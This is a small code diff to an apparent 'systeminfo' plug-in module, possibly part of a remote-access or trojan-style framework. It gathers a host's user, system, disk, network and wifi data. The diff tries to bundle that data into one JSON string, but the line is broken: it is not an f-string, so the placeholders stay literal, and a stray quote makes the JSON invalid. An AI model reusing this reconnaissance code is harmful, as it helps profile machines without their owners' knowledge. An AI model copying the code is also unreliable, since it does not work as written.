@@ -116,7 +116,13 @@ diskData = x.disk_data()
 networkData = x.network_data()
 wifiData = x.wifi_data()
 
+# add all data together
+
+
+
+allTogether = '{"user_data": {userData}, "system_data": {systemData}, "disk_data": {diskData}, "network_data": {networkData}, "wifi_data": {wifiData}"}'
+
 def run(**args):
     print("[*] In de systeminfo module.")
-    return f"{userData}\n{systemData}\n{diskData}\n{networkData}\n{wifiData}"
+    return allTogether
 
